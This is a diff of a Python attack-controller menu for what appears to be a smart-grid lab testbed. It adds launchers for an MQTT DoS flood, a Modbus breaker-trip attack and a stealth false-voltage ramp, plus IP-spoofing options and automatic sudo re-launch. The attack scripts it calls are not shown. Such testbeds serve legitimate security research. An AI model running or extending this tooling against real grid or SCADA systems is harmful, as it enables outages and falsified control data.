@@ -27,8 +27,22 @@ import signal
 import subprocess
 import sys
 import time
+import warnings
 from datetime import datetime
 from pathlib import Path
+
+warnings.filterwarnings('ignore', category=DeprecationWarning)
+
+# Auto-elevate to root if run as non-root on Linux/Kali (required for Scapy raw sockets)
+if os.name != 'nt' and hasattr(os, 'geteuid') and os.geteuid() != 0:
+    print("[*] attack_controller requires root privileges for Scapy raw socket packet injection.")
+    print("[*] Re-launching with sudo...")
+    try:
+        os.execvp("sudo", ["sudo", "-E", sys.executable] + sys.argv)
+    except Exception as e:
+        print(f"[ERROR] Auto-elevation failed: {e}")
+        print("Please run manually: sudo python3 attack_controller.py")
+        sys.exit(1)
 
 try:
     import paho.mqtt.client as mqtt
@@ -41,8 +55,9 @@ except ImportError:
 # CONFIGURATION
 # ═══════════════════════════════════════════════════════
 
-BROKER_IP = "10.59.53.30"
+BROKER_IP = "10.54.192.30"
 BROKER_PORT = 1883
+ESP32_IP = "10.54.192.251"
 CMD_TOPIC = "smartgrid/node01/cmd"
 ALERTS_TOPIC = "smartgrid/alerts"
 SCRIPT_DIR = Path(__file__).parent
@@ -65,7 +80,10 @@ class AttackManager:
         if mqtt is None:
             return
         try:
-            self.mqtt_client = mqtt.Client(client_id='attack_controller')
+            try:
+                self.mqtt_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id='attack_controller')
+            except (AttributeError, TypeError):
+                self.mqtt_client = mqtt.Client(client_id='attack_controller')
             self.mqtt_client.connect(BROKER_IP, BROKER_PORT, keepalive=60)
             self.mqtt_client.loop_start()
             print(f"[MQTT] Connected to broker at {BROKER_IP}:{BROKER_PORT}")
@@ -139,11 +157,13 @@ class AttackManager:
             return
         
         cmd = [
-            "sudo", sys.executable, str(script),
+            sys.executable, str(script),
             "--duration", str(duration),
             "--interval", str(interval),
             "--voltage-scale", str(voltage_scale),
             "--current-scale", str(current_scale),
+            "--target-ip", BROKER_IP,
+            "--spoof-ip", ESP32_IP,
         ]
         if advanced in ('y', 'yes'):
             cmd.append("--advanced-mode")
@@ -180,7 +200,7 @@ class AttackManager:
         """Launch replay attack as subprocess."""
         print("\n--- Replay Attack Configuration ---")
         try:
-            duration = int(input("  Replay duration in seconds [60]: ").strip() or "60")
+            duration = int(input("  Duration in seconds [60]: ").strip() or "60")
             interval = float(input("  Replay interval in seconds [5.0]: ").strip() or "5.0")
             capture_timeout = int(input("  Capture timeout in seconds [30]: ").strip() or "30")
         except (ValueError, EOFError):
@@ -192,10 +212,12 @@ class AttackManager:
             return
         
         cmd = [
-            "sudo", sys.executable, str(script),
+            sys.executable, str(script),
             "--duration", str(duration),
             "--interval", str(interval),
             "--capture-timeout", str(capture_timeout),
+            "--target-ip", BROKER_IP,
+            "--esp32-ip", ESP32_IP,
         ]
         
         try:
@@ -225,6 +247,131 @@ class AttackManager:
         except Exception as e:
             print(f"[ERROR] Failed to launch replay: {e}")
     
+    def launch_dos(self):
+        """Launch DoS flood attack as subprocess."""
+        print("\n--- DoS Flood Attack Configuration ---")
+        try:
+            duration = int(input("  Duration in seconds [60]: ").strip() or "60")
+            threads = int(input("  Number of attack threads [10]: ").strip() or "10")
+            rate = int(input("  Messages/sec per thread [50]: ").strip() or "50")
+        except (ValueError, EOFError):
+            duration, threads, rate = 60, 10, 50
+        
+        script = SCRIPT_DIR / "attack_dos.py"
+        if not script.exists():
+            print(f"[ERROR] Script not found: {script}")
+            return
+        
+        cmd = [
+            sys.executable, str(script),
+            "--target", BROKER_IP,
+            "--port", str(BROKER_PORT),
+            "--duration", str(duration),
+            "--threads", str(threads),
+            "--rate", str(rate),
+        ]
+        
+        try:
+            proc = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=1,
+                stdin=subprocess.PIPE
+            )
+            # Auto-confirm the "press ENTER" prompt
+            proc.stdin.write('\n')
+            proc.stdin.flush()
+            
+            self.active_attacks['DOS_FLOOD'] = {
+                'type': 'subprocess',
+                'process': proc,
+                'started': time.time(),
+                'duration': duration,
+                'pid': proc.pid
+            }
+            print(f"[ATTACK] DoS flood attack launched (PID: {proc.pid})")
+            print(f"[ATTACK] {threads} threads × {rate} msg/s = {threads * rate} msg/s total")
+            
+            import threading
+            def print_output():
+                for line in proc.stdout:
+                    print(f"  {line.rstrip()}")
+            t = threading.Thread(target=print_output, daemon=True)
+            t.start()
+            
+        except Exception as e:
+            print(f"[ERROR] Failed to launch DoS attack: {e}")
+    
+    def launch_modbus_attack(self):
+        """Launch Modbus TCP attack interactive console."""
+        script = SCRIPT_DIR / "attack_modbus.py"
+        if not script.exists():
+            print(f"[ERROR] Script not found: {script}")
+            return
+        cmd = [sys.executable, str(script), "--target", BROKER_IP, "--port", "5020"]
+        try:
+            subprocess.run(cmd)
+        except Exception as e:
+            print(f"[ERROR] Failed to run Modbus attack: {e}")
+
+    def launch_ramp_attack(self):
+        """Launch Stealth FDI Ramp Attack as subprocess."""
+        print("\n--- Stealth FDI Ramp Attack Configuration ---")
+        try:
+            duration = int(input("  Duration in seconds [60]: ").strip() or "60")
+            interval = float(input("  Injection interval in seconds [3.0]: ").strip() or "3.0")
+            start_v = float(input("  Starting Voltage in Volts [230.0]: ").strip() or "230.0")
+            step_v = float(input("  Drift step in Volts per interval [0.8]: ").strip() or "0.8")
+            max_v = float(input("  Ceiling Voltage in Volts [265.0]: ").strip() or "265.0")
+            advanced = input("  Advanced mode (authentic HMAC insider threat)? [y/N]: ").strip().lower()
+        except (ValueError, EOFError):
+            duration, interval, start_v, step_v, max_v, advanced = 60, 3.0, 230.0, 0.8, 265.0, 'n'
+
+        script = SCRIPT_DIR / "attack_ramp.py"
+        if not script.exists():
+            print(f"[ERROR] Script not found: {script}")
+            return
+
+        cmd = [
+            sys.executable, str(script),
+            "--duration", str(duration),
+            "--interval", str(interval),
+            "--start-voltage", str(start_v),
+            "--step", str(step_v),
+            "--max-voltage", str(max_v),
+            "--target-ip", BROKER_IP,
+        ]
+        if advanced in ('y', 'yes'):
+            cmd.append("--advanced-mode")
+
+        try:
+            proc = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=1
+            )
+            self.active_attacks['FDI_RAMP'] = {
+                'type': 'subprocess',
+                'process': proc,
+                'started': time.time(),
+                'duration': duration,
+                'pid': proc.pid
+            }
+            print(f"[ATTACK] Stealth FDI Ramp attack launched (PID: {proc.pid})")
+
+            import threading
+            def print_output():
+                for line in proc.stdout:
+                    print(f"  {line.rstrip()}")
+            t = threading.Thread(target=print_output, daemon=True)
+            t.start()
+        except Exception as e:
+            print(f"[ERROR] Failed to launch ramp attack: {e}")
+
     # ═══════════════════════════════════════════════════
     # ATTACK MANAGEMENT
     # ═══════════════════════════════════════════════════
@@ -322,9 +469,12 @@ def print_menu():
 ║  1. FDI via MQTT Command (ESP32 falsifies own readings)     ║
 ║  2. IP Spoofing Attack (forged source IP packets)           ║
 ║  3. Replay Attack (capture + replay)                        ║
-║  4. Stop All Attacks                                        ║
-║  5. Status (show running attacks)                           ║
-║  6. Exit                                                     ║
+║  4. DoS Flood Attack (MQTT message flood)                   ║
+║  5. Modbus TCP Attack (SCADA Recon & Breaker Trip)          ║
+║  6. Stealth FDI Ramp Attack (gradual monotonic drift)       ║
+║  7. Stop All Attacks                                        ║
+║  8. Status (show running attacks)                           ║
+║  9. Exit                                                     ║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
 """)
@@ -345,7 +495,7 @@ def main():
         while True:
             print_menu()
             try:
-                choice = input("  Select option [1-6]: ").strip()
+                choice = input("  Select option [1-9]: ").strip()
             except (EOFError, KeyboardInterrupt):
                 break
             
@@ -356,14 +506,20 @@ def main():
             elif choice == '3':
                 manager.launch_replay()
             elif choice == '4':
-                manager.stop_all_attacks()
+                manager.launch_dos()
             elif choice == '5':
-                manager.show_status()
+                manager.launch_modbus_attack()
             elif choice == '6':
+                manager.launch_ramp_attack()
+            elif choice == '7':
+                manager.stop_all_attacks()
+            elif choice == '8':
+                manager.show_status()
+            elif choice == '9':
                 print("\n[EXIT] Shutting down attack controller...")
                 break
             else:
-                print("[ERROR] Invalid option. Please select 1-6.")
+                print("[ERROR] Invalid option. Please select 1-9.")
             
             # Small pause for output to flush
             time.sleep(0.5)
@@ -377,3 +533,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
